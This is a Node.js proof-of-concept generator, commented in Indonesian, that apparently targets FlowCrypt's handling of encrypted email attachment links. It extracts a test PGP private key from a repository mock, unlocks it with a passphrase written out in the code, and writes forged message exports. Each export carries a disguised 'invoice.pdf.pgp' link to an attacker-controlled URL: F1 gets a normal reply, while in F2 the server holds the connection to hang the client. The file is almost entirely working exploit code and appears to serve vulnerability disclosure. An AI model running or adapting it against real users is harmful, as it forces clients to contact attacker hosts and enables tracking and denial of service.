#!/usr/bin/env node
/**
 * Generator exported-message PoC (F1/F2) di runner CI.
 * Pakai openpgp dari appium node_modules (sama dgn repo).
 *
 * Usage: node gen_feed.js <attacker_base_url> <outdir>
 *  - F1: https://host/open/FC-F1-<runid>  (server mode normal, cepat respond)
 *  - F2: https://host/open/FC-F2-<runid>  (server mode dos-hang, koneksi ditahan)
 * Menulis: <outdir>/message-export-poc-f1.json & -f2.json + feed-info.json
 */
'use strict';
const fs = require('fs');
const path = require('path');

const OPENPGP = path.join(process.cwd(), 'node_modules', 'openpgp');
const EKM_TS = path.join(process.cwd(), 'api-mocks', 'apis', 'ekm', 'ekm-endpoints.ts');

(async () => {
  const openpgp = require(OPENPGP);
  const base = process.argv[2];
  const outdir = process.argv[3];
  const runid = process.argv[4] || String(Date.now());
  if (!base || !outdir) {
    console.error('usage: node gen_feed.js <attacker_base_url> <outdir> [runid]');
    process.exit(2);
  }

  // --- extract e2e private key dari repo (sumber kebenaran yang sama dgn EKM mock) ---
  const src = fs.readFileSync(EKM_TS, 'utf8');
  const m = src.match(/e2e:\s*\{[\s\S]*?prv: \`(-----BEGIN PGP PRIVATE KEY BLOCK[\s\S]*?)\`/);
  if (!m) throw new Error('e2e prv tidak ditemukan di ekm-endpoints.ts');
  let prv = await openpgp.readPrivateKey({ armoredKey: m[1] });
  if (!prv.isDecrypted()) {
    prv = await openpgp.decryptKey({ privateKey: prv, passphrase: 'London blueBARREY capi' });
  }
  const pub = prv.toPublic();

  const b64url = (s) => Buffer.from(s, 'utf8').toString('base64').replace(/\+/g, '-').replace(/\//g, '_');
  const cryptupData = b64url(JSON.stringify({ name: 'invoice.pdf.pgp', type: 'application/octet-stream', size: 4096 }));

  const build = async (label, urlPath) => {
    const url = `${base.replace(/\/$/, '')}/${urlPath}`;
    const plaintext =
      `Hi, please find the attached invoice.\n\n` +
      `<a href="${url}" class="cryptup_file" cryptup-data="${cryptupData}">invoice.pdf.pgp</a>\n`;
    const msg = await openpgp.createMessage({ text: plaintext });
    const enc = await openpgp.encrypt({ message: msg, encryptionKeys: [pub], format: 'armored' });

    // self-test: decrypt balik
    const rd = await openpgp.decrypt({
      message: await openpgp.readMessage({ armoredMessage: enc }),
      decryptionKeys: [prv],
    });
    if (!rd.data.includes(url)) throw new Error('self-decrypt gagal: url tidak cocok');

    const subject = `POC attachment link ${label}`;
    const msgid = `18f1a2b3c4d5${String(Math.floor(Math.random() * 1e8)).padStart(8, '0')}`;
    const mimeHeaders =
      'Content-Type: text/plain; charset="UTF-8"\r\n' +
      'Content-Transfer-Encoding: 7bit\r\n' +
      'Openpgp: id=38100D21F17326E447869DA7A54D82BE1521D20E\r\n' +
      'From: e2e enterprise test at FlowCrypt <e2e.enterprise.test@flowcrypt.com>\r\n' +
      'To: e2e enterprise test at FlowCrypt <e2e.enterprise.test@flowcrypt.com>\r\n' +
      `Subject: ${subject}\r\n` +
      `Date: ${new Date().toUTCString().replace('GMT', '+0000')}\r\n` +
      `Message-Id: <${msgid}@poc.flowcrypt.com>\r\n` +
      'MIME-Version: 1.0\r\n' +
      '\r\n';
    const rawStr = mimeHeaders + enc + '\r\n';
    const rawB64 = Buffer.from(rawStr, 'utf8').toString('base64');
    const ts = Date.now();
    const bodyB64 = Buffer.from(enc, 'utf8').toString('base64');
    const headers = [
      { name: 'Content-Type', value: 'text/plain; charset="UTF-8"' },
      { name: 'Content-Transfer-Encoding', value: '7bit' },
      { name: 'Openpgp', value: 'id=38100D21F17326E447869DA7A54D82BE1521D20E' },
      { name: 'From', value: 'e2e enterprise test at FlowCrypt <e2e.enterprise.test@flowcrypt.com>' },
      { name: 'To', value: 'e2e enterprise test at FlowCrypt <e2e.enterprise.test@flowcrypt.com>' },
      { name: 'Subject', value: subject },
      { name: 'Date', value: new Date().toUTCString().replace('GMT', '+0000') },
      { name: 'Message-Id', value: `<${msgid}@poc.flowcrypt.com>` },
      { name: 'MIME-Version', value: '1.0' },
    ];
    const common = {
      id: msgid, threadId: msgid, labelIds: ['SENT', 'INBOX', 'UNREAD'],
      snippet: 'please find the attached invoice', sizeEstimate: rawStr.length,
      historyId: msgid, internalDate: ts,
    };
    const full = { ...common, payload: { partId: '', mimeType: 'text/plain', filename: '', headers, body: { attachmentId: `att_${msgid}`, size: bodyB64.length, data: bodyB64 }, parts: [] } };
    const raw = { ...common, raw: rawB64 };
    const exported = { acctEmail: 'e2e.enterprise.test@flowcrypt.com', full, attachments: {}, raw };

    const outFile = path.join(outdir, `message-export-poc-${label}.json`);
    fs.mkdirSync(outdir, { recursive: true });
    fs.writeFileSync(outFile, JSON.stringify(exported, null, 1));
    console.log(`written: ${outFile} (subject="${subject}", url=${url})`);
    return { label, subject, url };
  };

  const f1 = await build('F1', `open/FC-F1-${runid}`);
  const f2 = await build('F2', `open/FC-F2-${runid}`);
  fs.writeFileSync(path.join(outdir, 'feed-info.json'), JSON.stringify({ runid, f1, f2 }, null, 1));
  console.log('feed-info.json written');
})().catch((e) => {
  console.error('ERR:', e.message);
  process.exit(1);
});
